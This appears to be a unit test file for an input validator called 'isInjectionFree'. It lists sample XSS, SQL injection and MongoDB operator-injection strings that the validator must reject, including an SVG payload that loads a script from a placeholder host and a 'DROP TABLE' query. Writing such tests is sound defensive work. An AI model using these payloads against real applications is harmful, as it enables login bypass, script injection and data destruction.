import { isInjectionFree } from "../../src/utils/isInjectionFree";

describe("isInjectionFree", () => {
  it("should return false for XSS injection attempts", () => {
    expect(isInjectionFree('<script>alert("XSS")</script>')).toBe(false);
    expect(isInjectionFree("<img src=\"javascript:alert('XSS')\">")).toBe(
      false,
    );
    expect(
      isInjectionFree("<div onmouseover=\"alert('XSS')\">Hover me</div>"),
    ).toBe(false);
    expect(
      isInjectionFree(
        '<svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//HOST:PORT";d.body.appendChild(z)},0)>',
      ),
    ).toBe(false);
    expect(isInjectionFree("<body onload=alert('XSS')>")).toBe(false);
  });

  it("should return false for SQL injection attempts", () => {
    expect(
      isInjectionFree("SELECT * FROM users WHERE id = 1; DROP TABLE users;"),
    ).toBe(false);
    expect(isInjectionFree("1 OR 1=1")).toBe(false);
    expect(isInjectionFree("admin' -- djsa")).toBe(false);
    expect(isInjectionFree("admin' -- -")).toBe(false);
    expect(isInjectionFree("admin' --")).toBe(false);
    expect(isInjectionFree("admin' #")).toBe(false);
    expect(isInjectionFree("admin'/*")).toBe(false);
  });

  it("should return false for MongoDB injection attempts", () => {
    expect(isInjectionFree('{"$where": "this.age == 25"}')).toBe(false);
    expect(
      isInjectionFree("db.users.find({ $where: \"this.name == 'admin'\" })"),
    ).toBe(false);
    expect(isInjectionFree('{"$gt": ""}')).toBe(false);
    expect(isInjectionFree('{"$ne": ""}')).toBe(false);
    expect(isInjectionFree('{"$in": ""}')).toBe(false);
    expect(isInjectionFree('{"$exists": ""}')).toBe(false);
  });

  it("should return true for safe inputs", () => {
    expect(isInjectionFree("Hello, world!")).toBe(true);
    expect(isInjectionFree("This is a safe string.")).toBe(true);
    expect(isInjectionFree("12345")).toBe(true);
  });
});
